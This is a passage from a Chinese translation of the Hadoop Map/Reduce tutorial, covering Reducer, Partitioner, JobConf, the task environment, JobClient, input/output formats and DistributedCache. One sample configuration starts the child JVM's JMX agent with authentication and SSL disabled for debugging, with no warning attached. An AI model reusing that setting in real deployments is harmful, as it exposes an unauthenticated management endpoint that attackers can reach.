rel="noopener">reduce(WritableComparable, Iterator, OutputCollector, Reporter)</a>)方法。之后，应用程序可以通过重写<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/Closeable.html#close(" target="_blank" rel="noopener">Closeable.close()</a>)来执行相应的清理工作。</p><p>Reducer有3个主要阶段：shuffle、sort和reduce。</p><p>Reducer的输入就是Mapper已经排好序的输出。在这个阶段，框架通过HTTP为每个Reducer获得所有Mapper输出中与之相关的分块。</p><p>这个阶段，框架将按照key的值对Reducer的输入进行分组 （因为不同mapper的输出中可能会有相同的key）。</p><p>Shuffle和Sort两个阶段是同时进行的；map的输出也是一边被取回一边被合并的。</p><p>如果需要中间过程对key的分组规则和reduce前对key的分组规则不同，那么可以通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setOutputValueGroupingComparator(java.lang.Class" target="_blank" rel="noopener"> JobConf.setOutputValueGroupingComparator(Class)</a>)来指定一个Comparator。再加上 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setOutputKeyComparatorClass(java.lang.Class" target="_blank" rel="noopener">JobConf.setOutputKeyComparatorClass(Class)</a>)可用于控制中间过程的key如何被分组，所以结合两者可以实现<em>按值的二次排序</em>。</p><p>在这个阶段，框架为已分组的输入数据中的每个 <key, (list of values)>对调用一次 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reducer.html#reduce(K2, java.util.Iterator, org.apache.hadoop.mapred.OutputCollector, org.apache.hadoop.mapred.Reporter" target="_blank" rel="noopener">reduce(WritableComparable, Iterator, OutputCollector, Reporter)</a>)方法。</p><p>Reduce任务的输出通常是通过调用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html#collect(K, V" target="_blank" rel="noopener">OutputCollector.collect(WritableComparable, Writable)</a>)写入 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/fs/FileSystem.html" target="_blank" rel="noopener">文件系统</a>的。</p><p>应用程序可以使用Reporter报告进度，设定应用程序级别的状态消息，更新Counters（计数器），或者仅是表明自己运行正常。</p><p>Reducer的输出是<em>没有排序的</em>。</p><p>Reduce的数目建议是0.95或1.75乘以 (&lt;<em>no. of nodes</em>&gt; * mapred.tasktracker.reduce.tasks.maximum)。</p><p>用0.95，所有reduce可以在maps一完成时就立刻启动，开始传输map的输出结果。用1.75，速度快的节点可以在完成第一轮reduce任务后，可以开始第二轮，这样可以得到比较好的负载均衡的效果。</p><p>增加reduce的数目会增加整个框架的开销，但可以改善负载均衡，降低由于执行失败带来的负面影响。</p><p>上述比例因子比整体数目稍小一些是为了给框架中的推测性任务（speculative-tasks） 或失败的任务预留一些reduce的资源。</p><p>如果没有归约要进行，那么设置reduce任务的数目为<em>零</em>是合法的。</p><p>这种情况下，map任务的输出会直接被写入由 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputPath(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path" target="_blank" rel="noopener">setOutputPath(Path)</a>)指定的输出路径。框架在把它们写入FileSystem之前没有对它们进行排序。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Partitioner.html" target="_blank" rel="noopener">Partitioner</a>用于划分键值空间（key space）。</p><p>Partitioner负责控制map输出结果key的分割。Key（或者一个key子集）被用于产生分区，通常使用的是Hash函数。分区的数目与一个作业的reduce任务的数目是一样的。因此，它控制将中间过程的key（也就是这条记录）应该发送给m个reduce任务中的哪一个来进行reduce操作。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/lib/HashPartitioner.html" target="_blank" rel="noopener">HashPartitioner</a>是默认的 Partitioner。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html" target="_blank" rel="noopener">Reporter</a>是用于Map/Reduce应用程序报告进度，设定应用级别的状态消息， 更新Counters（计数器）的机制。</p><p>Mapper和Reducer的实现可以利用Reporter 来报告进度，或者仅是表明自己运行正常。在那种应用程序需要花很长时间处理个别键值对的场景中，这种机制是很关键的，因为框架可能会以为这个任务超时了，从而将它强行杀死。另一个避免这种情况发生的方式是，将配置参数mapred.task.timeout设置为一个足够高的值（或者干脆设置为零，则没有超时限制了）。</p><p>应用程序可以用Reporter来更新Counter（计数器）。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputCollector.html" target="_blank" rel="noopener">OutputCollector</a>是一个Map/Reduce框架提供的用于收集 Mapper或Reducer输出数据的通用机制 （包括中间输出结果和作业的输出结果）。</p><p>Hadoop Map/Reduce框架附带了一个包含许多实用型的mapper、reducer和partitioner 的<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/lib/package-summary.html" target="_blank" rel="noopener">类库</a>。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html" target="_blank" rel="noopener">JobConf</a>代表一个Map/Reduce作业的配置。</p><p>JobConf是用户向Hadoop框架描述一个Map/Reduce作业如何执行的主要接口。框架会按照JobConf描述的信息忠实地去尝试完成这个作业，然而：</p><ul><li>一些参数可能会被管理者标记为<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#FinalParams" target="_blank" rel="noopener"> final</a>，这意味它们不能被更改。</li><li>一些作业的参数可以被直截了当地进行设置（例如： <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumReduceTasks(int" target="_blank" rel="noopener">setNumReduceTasks(int)</a>)），而另一些参数则与框架或者作业的其他参数之间微妙地相互影响，并且设置起来比较复杂（例如：<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setNumMapTasks(int" target="_blank" rel="noopener"> setNumMapTasks(int)</a>)）。</li></ul><p>通常，JobConf会指明Mapper、Combiner(如果有的话)、 Partitioner、Reducer、InputFormat和 OutputFormat的具体实现。JobConf还能指定一组输入文件 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#setInputPaths(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path[]" target="_blank" rel="noopener">setInputPaths(JobConf, Path…)</a>) /<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#addInputPath(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path" target="_blank" rel="noopener">addInputPath(JobConf, Path)</a>)) 和(<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#setInputPaths(org.apache.hadoop.mapred.JobConf, java.lang.String" target="_blank" rel="noopener">setInputPaths(JobConf, String)</a>) /<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html#addInputPath(org.apache.hadoop.mapred.JobConf, java.lang.String" target="_blank" rel="noopener">addInputPaths(JobConf, String)</a>)) 以及输出文件应该写在哪儿 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputPath(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.fs.Path" target="_blank" rel="noopener">setOutputPath(Path)</a>))。</p><p>JobConf可选择地对作业设置一些高级选项，例如：设置Comparator； 放到DistributedCache上的文件；中间结果或者作业输出结果是否需要压缩以及怎么压缩； 利用用户提供的脚本(<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapDebugScript(java.lang.String" target="_blank" rel="noopener">setMapDebugScript(String)</a>)/<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setReduceDebugScript(java.lang.String" target="_blank" rel="noopener">setReduceDebugScript(String)</a>)) 进行调试；作业是否允许<em>预防性（speculative）</em>任务的执行 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapSpeculativeExecution(boolean" target="_blank" rel="noopener">setMapSpeculativeExecution(boolean)</a>))/(<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setReduceSpeculativeExecution(boolean" target="_blank" rel="noopener">setReduceSpeculativeExecution(boolean)</a>)) ；每个任务最大的尝试次数 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxMapAttempts(int" target="_blank" rel="noopener">setMaxMapAttempts(int)</a>)/<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxReduceAttempts(int" target="_blank" rel="noopener">setMaxReduceAttempts(int)</a>)) ；一个作业能容忍的任务失败的百分比 (<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxMapTaskFailuresPercent(int" target="_blank" rel="noopener">setMaxMapTaskFailuresPercent(int)</a>)/<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMaxReduceTaskFailuresPercent(int" target="_blank" rel="noopener">setMaxReduceTaskFailuresPercent(int)</a>)) ；等等。</p><p>当然，用户能使用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#set(java.lang.String, java.lang.String" target="_blank" rel="noopener">set(String, String)</a>)/<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/conf/Configuration.html#get(java.lang.String, java.lang.String" target="_blank" rel="noopener">get(String, String)</a>) 来设置或者取得应用程序需要的任意参数。然而，DistributedCache的使用是面向大规模只读数据的。</p><p>TaskTracker是在一个单独的jvm上以子进程的形式执行 Mapper/Reducer任务（Task）的。</p><p>子任务会继承父TaskTracker的环境。用户可以通过JobConf中的 mapred.child.java.opts配置参数来设定子jvm上的附加选项，例如： 通过-Djava.library.path=&lt;&gt; 将一个非标准路径设为运行时的链接用以搜索共享库，等等。如果mapred.child.java.opts包含一个符号<em>@taskid@</em>， 它会被替换成map/reduce的taskid的值。</p><p>下面是一个包含多个参数和替换的例子，其中包括：记录jvm GC日志； JVM JMX代理程序以无密码的方式启动，这样它就能连接到jconsole上，从而可以查看子进程的内存和线程，得到线程的dump；还把子jvm的最大堆尺寸设置为512MB， 并为子jvm的java.library.path添加了一个附加路径。</p><property> <name>mapred.child.java.opts</name> <value>   -Xmx512M -Djava.library.path=/home/mycompany/lib -verbose:gc -Xloggc:/tmp/@taskid@.gc   -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false </value></property><p>用户或管理员也可以使用mapred.child.ulimit设定运行的子任务的最大虚拟内存。mapred.child.ulimit的值以（KB)为单位，并且必须大于或等于-Xmx参数传给JavaVM的值，否则VM会无法启动。</p><p>注意：mapred.child.java.opts只用于设置task tracker启动的子任务。为守护进程设置内存选项请查看 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/cluster_setup.html#配置Hadoop守护进程的运行环境" target="_blank" rel="noopener">cluster_setup.html</a></p><p>${mapred.local.dir}/taskTracker/是task tracker的本地目录， 用于创建本地缓存和job。它可以指定多个目录（跨越多个磁盘），文件会半随机的保存到本地路径下的某个目录。当job启动时，task tracker根据配置文档创建本地job目录，目录结构如以下所示：</p><ul><li><p>${mapred.local.dir}/taskTracker/archive/ :分布式缓存。这个目录保存本地的分布式缓存。因此本地分布式缓存是在所有task和job间共享的。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/</p></li></ul><p>  : 本地job目录。</p><ul><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/work/: job指定的共享目录。各个任务可以使用这个空间做为暂存空间，用于它们之间共享文件。这个目录通过job.local.dir 参数暴露给用户。这个路径可以通过API <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#getJobLocalDir(" target="_blank" rel="noopener">JobConf.getJobLocalDir()</a>)来访问。它也可以被做为系统属性获得。因此，用户（比如运行streaming）可以调用System.getProperty(“job.local.dir”)获得该目录。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/jars/: 存放jar包的路径，用于存放作业的jar文件和展开的jar。job.jar是应用程序的jar文件，它会被自动分发到各台机器，在task启动前会被自动展开。使用api <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#getJar(" target="_blank" rel="noopener">JobConf.getJar() </a>)函数可以得到job.jar的位置。使用JobConf.getJar().getParent()可以访问存放展开的jar包的目录。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/job.xml： 一个job.xml文件，本地的通用的作业配置文件。</p></li><li><p>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid</p><p>： 每个任务有一个目录</p><p>task-id</p><p>，它里面有如下的目录结构：</p><ul><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/job.xml： 一个job.xml文件，本地化的任务作业配置文件。任务本地化是指为该task设定特定的属性值。这些值会在下面具体说明。</li><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/output 一个存放中间过程的输出文件的目录。它保存了由framwork产生的临时map reduce数据，比如map的输出文件等。</li><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/work： task的当前工作目录。</li><li>${mapred.local.dir}/taskTracker/jobcache/$jobid/$taskid/work/tmp： task的临时目录。（用户可以设定属性mapred.child.tmp 来为map和reduce task设定临时目录。缺省值是./tmp。如果这个值不是绝对路径， 它会把task的工作路径加到该路径前面作为task的临时文件路径。如果这个值是绝对路径则直接使用这个值。 如果指定的目录不存在，会自动创建该目录。之后，按照选项 -Djava.io.tmpdir=’临时文件的绝对路径’执行java子任务。 pipes和streaming的临时文件路径是通过环境变量TMPDIR=’the absolute path of the tmp dir’设定的）。 如果mapred.child.tmp有./tmp值，这个目录会被创建。</li></ul></li></ul><p>下面的属性是为每个task执行时使用的本地参数，它们保存在本地化的任务作业配置文件里：</p><div class="table-container"><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">类型</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">mapred.job.id</td><td style="text-align:center">String</td><td style="text-align:center">job id</td></tr><tr><td style="text-align:center">mapred.jar</td><td style="text-align:center">String</td><td style="text-align:center">job目录下job.jar的位置</td></tr><tr><td style="text-align:center">job.local.dir</td><td style="text-align:center">String</td><td style="text-align:center">job指定的共享存储空间</td></tr><tr><td style="text-align:center">mapred.tip.id</td><td style="text-align:center">String</td><td style="text-align:center">task id</td></tr><tr><td style="text-align:center">mapred.task.id</td><td style="text-align:center">String</td><td style="text-align:center">task尝试id</td></tr><tr><td style="text-align:center">mapred.task.is.map</td><td style="text-align:center">boolean</td><td style="text-align:center">是否是map task</td></tr><tr><td style="text-align:center">mapred.task.partition</td><td style="text-align:center">int</td><td style="text-align:center">task在job中的id</td></tr><tr><td style="text-align:center">map.input.file</td><td style="text-align:center">String</td><td style="text-align:center">map读取的文件名</td></tr><tr><td style="text-align:center">map.input.start</td><td style="text-align:center">long</td><td style="text-align:center">map输入的数据块的起始位置偏移</td></tr><tr><td style="text-align:center">map.input.length</td><td style="text-align:center">long</td><td style="text-align:center">map输入的数据块的字节数</td></tr><tr><td style="text-align:center">mapred.work.output.dir</td><td style="text-align:center">String</td><td style="text-align:center">task临时输出目录</td></tr></tbody></table></div><p>task的标准输出和错误输出流会被读到TaskTracker中，并且记录到 ${HADOOP_LOG_DIR}/userlogs</p><p><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#DistributedCache" target="_blank" rel="noopener">DistributedCache</a> 可用于map或reduce task中分发jar包和本地库。子jvm总是把 <em>当前工作目录</em> 加到 java.library.path 和 LD_LIBRARY_PATH。 因此，可以通过 <a href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/System.html#loadLibrary(java.lang.String" target="_blank" rel="noopener">System.loadLibrary</a>)或 <a href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/System.html#load(java.lang.String" target="_blank" rel="noopener">System.load</a>)装载缓存的库。有关使用分布式缓存加载共享库的细节请参考 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/native_libraries.html#使用DistributedCache+加载本地库" target="_blank" rel="noopener">native_libraries.html</a></p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobClient.html" target="_blank" rel="noopener">JobClient</a>是用户提交的作业与JobTracker交互的主要接口。</p><p>JobClient 提供提交作业，追踪进程，访问子任务的日志记录，获得Map/Reduce集群状态信息等功能。</p><p>作业提交过程包括：</p><ol><li>检查作业输入输出样式细节</li><li>为作业计算InputSplit值。</li><li>如果需要的话，为作业的DistributedCache建立必须的统计信息。</li><li>拷贝作业的jar包和配置文件到FileSystem上的Map/Reduce系统目录下。</li><li>提交作业到JobTracker并且监控它的状态。</li></ol><p>作业的历史文件记录到指定目录的”_logs/history/“子目录下。这个指定目录由hadoop.job.history.user.location设定，默认是作业输出的目录。因此默认情况下，文件会存放在mapred.output.dir/_logs/history目录下。用户可以设置hadoop.job.history.user.location为none来停止日志记录。</p><p>用户使用下面的命令可以看到在指定目录下的历史日志记录的摘要。<br>$ bin/hadoop job -history output-dir<br>这个命令会打印出作业的细节，以及失败的和被杀死的任务细节。<br>要查看有关作业的更多细节例如成功的任务、每个任务尝试的次数（task attempt）等，可以使用下面的命令<br>$ bin/hadoop job -history all output-dir</p><p>用户可以使用 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputLogFilter.html" target="_blank" rel="noopener">OutputLogFilter</a> 从输出目录列表中筛选日志文件。</p><p>一般情况，用户利用JobConf创建应用程序并配置作业属性， 然后用 JobClient 提交作业并监视它的进程。</p><p>有时候，用一个单独的Map/Reduce作业并不能完成一个复杂的任务，用户也许要链接多个Map/Reduce作业才行。这是容易实现的，因为作业通常输出到分布式文件系统上的，所以可以把这个作业的输出作为下一个作业的输入实现串联。</p><p>然而，这也意味着，确保每一作业完成(成功或失败)的责任就直接落在了客户身上。在这种情况下，可以用的控制作业的选项有：</p><ul><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobClient.html#runJob(org.apache.hadoop.mapred.JobConf" target="_blank" rel="noopener">runJob(JobConf)</a>)：提交作业，仅当作业完成时返回。</li><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobClient.html#submitJob(org.apache.hadoop.mapred.JobConf" target="_blank" rel="noopener">submitJob(JobConf)</a>)：只提交作业，之后需要你轮询它返回的 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/RunningJob.html" target="_blank" rel="noopener">RunningJob</a>句柄的状态，并根据情况调度。</li><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setJobEndNotificationURI(java.lang.String" target="_blank" rel="noopener">JobConf.setJobEndNotificationURI(String)</a>)：设置一个作业完成通知，可避免轮询。</li></ul><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/InputFormat.html" target="_blank" rel="noopener">InputFormat</a> 为Map/Reduce作业描述输入的细节规范。</p><p>Map/Reduce框架根据作业的InputFormat来：</p><ol><li>检查作业输入的有效性。</li><li>把输入文件切分成多个逻辑InputSplit实例， 并把每一实例分别分发给一个 Mapper。</li><li>提供RecordReader的实现，这个RecordReader从逻辑InputSplit中获得输入记录， 这些记录将由Mapper处理。</li></ol><p>基于文件的InputFormat实现（通常是 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html" target="_blank" rel="noopener">FileInputFormat</a>的子类） 默认行为是按照输入文件的字节大小，把输入数据切分成逻辑分块（<em>logical</em> InputSplit ）。 其中输入文件所在的FileSystem的数据块尺寸是分块大小的上限。下限可以设置mapred.min.split.size 的值。</p><p>考虑到边界情况，对于很多应用程序来说，很明显按照文件大小进行逻辑分割是不能满足需求的。 在这种情况下，应用程序需要实现一个RecordReader来处理记录的边界并为每个任务提供一个逻辑分块的面向记录的视图。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/TextInputFormat.html" target="_blank" rel="noopener">TextInputFormat</a> 是默认的InputFormat。</p><p>如果一个作业的Inputformat是TextInputFormat， 并且框架检测到输入文件的后缀是<em>.gz</em>和<em>.lzo</em>，就会使用对应的CompressionCodec自动解压缩这些文件。 但是需要注意，上述带后缀的压缩文件不会被切分，并且整个压缩文件会分给一个mapper来处理。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/InputSplit.html" target="_blank" rel="noopener">InputSplit</a> 是一个单独的Mapper要处理的数据块。</p><p>一般的InputSplit 是字节样式输入，然后由RecordReader处理并转化成记录样式。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileSplit.html" target="_blank" rel="noopener">FileSplit</a> 是默认的InputSplit。 它把 map.input.file 设定为输入文件的路径，输入文件是逻辑分块文件。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/RecordReader.html" target="_blank" rel="noopener">RecordReader</a> 从InputSlit读入<key, value>对。</p><p>一般的，RecordReader 把由InputSplit 提供的字节样式的输入文件，转化成由Mapper处理的记录样式的文件。 因此RecordReader负责处理记录的边界情况和把数据表示成keys/values对形式。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputFormat.html" target="_blank" rel="noopener">OutputFormat</a> 描述Map/Reduce作业的输出样式。</p><p>Map/Reduce框架根据作业的OutputFormat来：</p><ol><li>检验作业的输出，例如检查输出路径是否已经存在。</li><li>提供一个RecordWriter的实现，用来输出作业结果。 输出文件保存在FileSystem上。</li></ol><p>TextOutputFormat是默认的 OutputFormat。</p><p>在一些应用程序中，子任务需要产生一些side-file，这些文件与作业实际输出结果的文件不同。</p><p>在这种情况下，同一个Mapper或者Reducer的两个实例（比如预防性任务）同时打开或者写 FileSystem上的同一文件就会产生冲突。因此应用程序在写文件的时候需要为每次任务尝试（不仅仅是每次任务，每个任务可以尝试执行很多次）选取一个独一无二的文件名(使用attemptid，例如task_200709221812_0001_m_000000_0)。</p><p>为了避免冲突，Map/Reduce框架为每次尝试执行任务都建立和维护一个特殊的 ${mapred.output.dir}/<em>temporary/</em>${taskid}子目录，这个目录位于本次尝试执行任务输出结果所在的FileSystem上，可以通过 ${mapred.work.output.dir}来访问这个子目录。 对于成功完成的任务尝试，只有${mapred.output.dir}/<em>temporary/</em>${taskid}下的文件会<em>移动</em>到${mapred.output.dir}。当然，框架会丢弃那些失败的任务尝试的子目录。这种处理过程对于应用程序来说是完全透明的。</p><p>在任务执行期间，应用程序在写文件时可以利用这个特性，比如 通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#getWorkOutputPath(org.apache.hadoop.mapred.JobConf" target="_blank" rel="noopener"> FileOutputFormat.getWorkOutputPath()</a>)获得${mapred.work.output.dir}目录， 并在其下创建任意任务执行时所需的side-file，框架在任务尝试成功时会马上移动这些文件，因此不需要在程序内为每次任务尝试选取一个独一无二的名字。</p><p>注意：在每次任务尝试执行期间，${mapred.work.output.dir} 的值实际上是 ${mapred.output.dir}/<em>temporary/</em>{$taskid}，这个值是Map/Reduce框架创建的。 所以使用这个特性的方法是，在<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#getWorkOutputPath(org.apache.hadoop.mapred.JobConf" target="_blank" rel="noopener"> FileOutputFormat.getWorkOutputPath() </a>)路径下创建side-file即可。</p><p>对于只使用map不使用reduce的作业，这个结论也成立。这种情况下，map的输出结果直接生成到HDFS上。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/RecordWriter.html" target="_blank" rel="noopener">RecordWriter</a> 生成<key, value> 对到输出文件。</p><p>RecordWriter的实现把作业的输出结果写到 FileSystem。</p><h4 id="Counters"><a href="#Counters" class="headerlink" title="Counters"></a>Counters</h4><p>Counters 是多个由Map/Reduce框架或者应用程序定义的全局计数器。 每一个Counter可以是任何一种 Enum类型。同一特定Enum类型的Counter可以汇集到一个组，其类型为Counters.Group。</p><p>应用程序可以定义任意(Enum类型)的Counters并且可以通过 map 或者 reduce方法中的 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html#incrCounter(java.lang.Enum, long" target="_blank" rel="noopener">Reporter.incrCounter(Enum, long)</a>)或者 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html#incrCounter(java.lang.String, java.lang.String, long amount" target="_blank" rel="noopener">Reporter.incrCounter(String, String, long)</a>) 更新。之后框架会汇总这些全局counters。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html" target="_blank" rel="noopener">DistributedCache</a> 可将具体应用相关的、大尺寸的、只读的文件有效地分布放置。</p><p>DistributedCache 是Map/Reduce框架提供的功能，能够缓存应用程序所需的文件 （包括文本，档案文件，jar文件等）。</p><p>应用程序在JobConf中通过url(hdfs://)指定需要被缓存的文件。 DistributedCache假定由hdfs://格式url指定的文件已经在 FileSystem上了。</p><p>Map-Redcue框架在作业所有任务执行之前会把必要的文件拷贝到slave节点上。 它运行高效是因为每个作业的文件只拷贝一次并且为那些没有文档的slave节点缓存文档。</p><p>DistributedCache 根据缓存文档修改的时间戳进行追踪。 在作业执行期间，当前应用程序或者外部程序不能修改缓存文件。</p><p>distributedCache可以分发简单的只读数据或文本文件，也可以分发复杂类型的文件例如归档文件和jar文件。归档文件(zip,tar,tgz和tar.gz文件)在slave节点上会被<em>解档（un-archived）</em>。 这些文件可以设置<em>执行权限</em>。</p><p>用户可以通过设置mapred.cache.{files|archives}来分发文件。 如果要分发多个文件，可以使用逗号分隔文件所在路径。也可以利用API来设置该属性： <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addCacheFile(java.net.URI, org.apache.hadoop.conf.Configuration" target="_blank" rel="noopener">DistributedCache.addCacheFile(URI,conf)</a>)/ <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addCacheArchive(java.net.URI, org.apache.hadoop.conf.Configuration" target="_blank" rel="noopener">DistributedCache.addCacheArchive(URI,conf)</a>) and <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#setCacheFiles(java.net.URI[], org.apache.hadoop.conf.Configuration" target="_blank" rel="noopener">DistributedCache.setCacheFiles(URIs,conf)</a>)/ <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#setCacheArchives(java.net.URI[], org.apache.hadoop.conf.Configuration" target="_blank" rel="noopener">DistributedCache.setCacheArchives(URIs,conf)</a>) 其中URI的形式是 hdfs://host:port/absolute-path#link-name 在Streaming程序中，可以通过命令行选项 -cacheFile/-cacheArchive 分发文件。</p><p>用户可以通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#createSymlink(org.apache.hadoop.conf.Configuration" target="_blank" rel="noopener"> DistributedCache.createSymlink(Configuration)</a>)方法让DistributedCache 在<em>当前工作目录</em>下创建到缓存文件的符号链接。 或者通过设置配置文件属性mapred.create.symlink为yes。 分布式缓存会截取URI的片段作为链接的名字。 例如，URI是 hdfs://namenode:port/lib.so.1#lib.so， 则在task当前工作目录会有名为lib.so的链接， 它会链接分布式缓存中的lib.so.1。</p><p>DistributedCache可在map/reduce任务中作为 一种基础软件分发机制使用。它可以被用于分发jar包和本地库（native libraries）。 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addArchiveToClassPath(org.apache.hadoop.fs.Path, org.apache.hadoop.conf.Configuration" target="_blank" rel="noopener">DistributedCache.addArchiveToClassPath(Path, Configuration)</a>)和 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addFileToClassPath(org.apache.hadoop.fs.Path, org.apache.hadoop.conf.Configuration" target="_blank" rel="noopener">DistributedCache.addFileToClassPath(Path, Configuration)</a>) API能够被用于 缓存文件和jar包，并把它们加入子jvm的<em>classpath</em>。也可以通过设置配置文档里的属性 mapred.job.classpath.{files|archives}达到相同的效果。缓存文件可用于分发和装载本地库。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/util/Tool.html" target="_blank" rel="noopener">Tool</a> 接口支持处理常用的Hadoop命令行选项。</p><p>Tool 是Map/Reduce工具或应用的标准。应用程序应只处理其定制参数， 要把标准命令行选项通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/util/ToolRunner.html#run(org.apache.hadoop.util.Tool, java.lang.String[]" target="_blank" rel="noopener">ToolRunner.run(Tool, String[])</a>) 委托给 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/util/GenericOptionsParser.html" target="_blank" rel="noopener">GenericOptionsParser</a>处理。</p><p>Hadoop命令行的常用选项有：<br>-conf <configuration file><br>-D <property=value><br>-fs <local|namenode:port><br>-jt <local|jobtracker:port></p><p><a 